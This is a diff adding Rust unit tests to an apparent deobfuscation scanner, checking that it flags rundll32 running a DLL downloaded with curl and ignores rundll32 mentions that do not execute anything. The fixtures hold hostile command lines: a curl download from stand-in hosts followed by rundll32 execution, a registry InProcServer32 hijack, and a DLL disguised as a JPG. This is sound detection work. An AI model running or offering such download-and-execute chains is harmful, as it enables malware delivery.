@@ -13987,6 +13987,48 @@ rundll32.exe scrobj.dll,GenerateTypeLib https://rundll32-scrobj-deob.example/pay
     }
 
     #[test]
+    fn glued_rundll32_downloaded_dll_in_deob_text_resolves_url() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        env.traits.push(Trait::Download {
+            cmd: "curl --output welnar.nvn https://glued-rundll32.example/stage".to_string(),
+            src: "https://glued-rundll32.example/stage".to_string(),
+            dst: Some("welnar.nvn".to_string()),
+        });
+        crate::deob_scan::scan_deob_text("rundll32welnar.nvn,init", &mut env);
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Rundll32 { cmd, url: Some(url) }
+                        if cmd == "rundll32welnar.nvn,init"
+                            && url == "https://glued-rundll32.example/stage"
+                )
+            }),
+            "glued rundll32 downloaded DLL was not typed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn glued_rundll32_scanner_ignores_non_execution_mentions() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"set valinf="rundll32_31152_toolbar"
+reg add HKCU\Software\Classes\CLSID\{x}\InProcServer32 /ve /d "rundll32.exe" /f
+taskkill /im rundll32.exe /f
+rundll32 C:\programdata\putty.jpg,Wind"#,
+            &mut env,
+        );
+        assert!(
+            !env.traits
+                .iter()
+                .any(|t| matches!(t, Trait::Rundll32 { .. })),
+            "non-execution rundll32 mentions were typed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn html_help_url_emits_url_launch() {
         let mut env = crate::env::Environment::new(&Config::default());
         crate::deob_scan::scan_deob_text(
